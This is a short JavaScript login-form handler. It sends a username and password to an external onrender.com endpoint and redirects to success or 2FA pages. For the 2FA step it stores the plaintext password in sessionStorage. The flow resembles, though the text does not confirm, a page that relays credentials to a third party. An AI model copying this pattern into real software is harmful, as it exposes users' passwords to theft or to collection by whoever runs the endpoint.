document.addEventListener('DOMContentLoaded', function() {
    const form = document.querySelector('.login-form');
    const loginButton = document.getElementById('login-button');
    const buttonText = document.getElementById('button-text');
    const loadingGif = document.getElementById('loading-gif');
    const errorElement = document.getElementById('error-message');
    
    form.addEventListener('submit', function(e) {
        e.preventDefault();
        
        const username = document.getElementById('login-username').value.trim();
        const password = document.getElementById('login-password').value.trim();
        
        if (!username || !password) {
            showError('Please enter both username and password');
            return;
        }
        
        // Показать состояние загрузки
        buttonText.style.display = 'none';
        loadingGif.style.display = 'inline-block';
        loginButton.disabled = true;
        errorElement.style.display = 'none';
        
        fetch('https://yomae-service.onrender.com/process_login', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                username: username,
                password: password
            })
        })
        .then(response => {
            if (!response.ok) {
                return response.json().then(err => {
                    throw new Error(err.message || 'Server error');
                });
            }
            return response.json();
        })
        .then(data => {
            if (data.status === 'success') {
                window.location.href = '/yomae/website/verifed/index.html';
            } 
            else if (data.status === '2fa_required') {
                sessionStorage.setItem('loginData', JSON.stringify({
                    username: username,
                    password: password
                }));
                window.location.href = '/yomae/website/2FA/index.html';
            }
            else {
                showError(data.message || 'An error occurred');
            }
        })
        .catch(error => {
            console.error('Error:', error);
            showError(error.message || 'Server error. Please try again later.');
        })
        .finally(() => {
            // Восстановить кнопку
            buttonText.style.display = 'inline-block';
            loadingGif.style.display = 'none';
            loginButton.disabled = false;
        });
    });
    
    function showError(message) {
        errorElement.textContent = message;
        errorElement.style.display = 'block';
        // Анимация встряски
        errorElement.style.animation = 'none';
        setTimeout(() => {
            errorElement.style.animation = 'shake 0.5s';
        }, 10);
    }
});
